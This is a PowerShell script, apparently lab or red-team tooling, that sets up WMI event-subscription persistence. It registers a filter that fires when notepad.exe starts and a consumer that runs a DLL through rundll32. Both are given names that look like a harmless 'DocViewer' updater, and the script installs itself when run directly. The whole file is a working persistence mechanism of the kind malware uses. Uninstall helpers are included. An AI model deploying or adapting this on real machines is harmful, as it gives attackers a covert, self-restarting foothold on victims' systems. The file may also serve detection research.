# WMI Persistence helpers (dot-source friendly) — DocViewer lab defaults
# Prefer wmi_install.ps1 -Action install|uninstall|status for CLI use.

$TargetProcess = if ($env:TARGET_PROC) { $env:TARGET_PROC } else { "notepad.exe" }
$PayloadPath   = if ($env:PAYLOAD_PATH) { $env:PAYLOAD_PATH } else { "C:\ProgramData\DocViewer\DocViewerCore.dll" }
$Interval      = if ($env:INTERVAL_MIN) { [int]$env:INTERVAL_MIN } else { 5 }
$EventName     = if ($env:EVENT_NAME) { $env:EVENT_NAME } else { "DocViewerUpdateEvent" }
$ConsumerName  = if ($env:CONSUMER_NAME) { $env:CONSUMER_NAME } else { "DocViewerUpdateConsumer" }

function Remove-WMIEvent {
    param([string]$Name = $EventName)
    Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -ErrorAction SilentlyContinue |
        Where-Object { $_.Filter -match [regex]::Escape($Name) -or $_.Consumer -match [regex]::Escape($ConsumerName) } |
        ForEach-Object { $_ | Remove-WmiObject }
    Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$Name'" -ErrorAction SilentlyContinue | Remove-WmiObject
    Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject
}

function Create-WMIFilter {
    $Query = @"
SELECT * FROM __InstanceCreationEvent WITHIN $Interval
WHERE TargetInstance ISA 'Win32_Process'
AND TargetInstance.Name = '$TargetProcess'
"@
    return Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
        Name           = $EventName
        EventNamespace = "root\cimv2"
        QueryLanguage  = "WQL"
        Query          = $Query
    }
}

function Create-WMIConsumer {
    $CommandLineTemplate = "cmd.exe /c rundll32.exe `"$PayloadPath`",EntryPoint"
    return Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
        Name                = $ConsumerName
        CommandLineTemplate = $CommandLineTemplate
    }
}

function Bind-WMIBinding {
    param($Filter, $Consumer)
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
        Filter   = $Filter
        Consumer = $Consumer
    } | Out-Null
}

function Install-Persistence {
    Write-Host "Installing WMI persistence (DocViewer lab)..."
    Remove-WMIEvent $EventName
    $Filter = Create-WMIFilter
    $Consumer = Create-WMIConsumer
    Bind-WMIBinding $Filter $Consumer
    Write-Host "WMI persistence installed: trigger=$TargetProcess payload=$PayloadPath"
}

function Uninstall-Persistence {
    Write-Host "Removing WMI persistence..."
    Remove-WMIEvent $EventName
    Write-Host "WMI persistence removed"
}

# If executed directly (not dot-sourced), install.
if ($MyInvocation.InvocationName -ne '.') {
    Install-Persistence
}
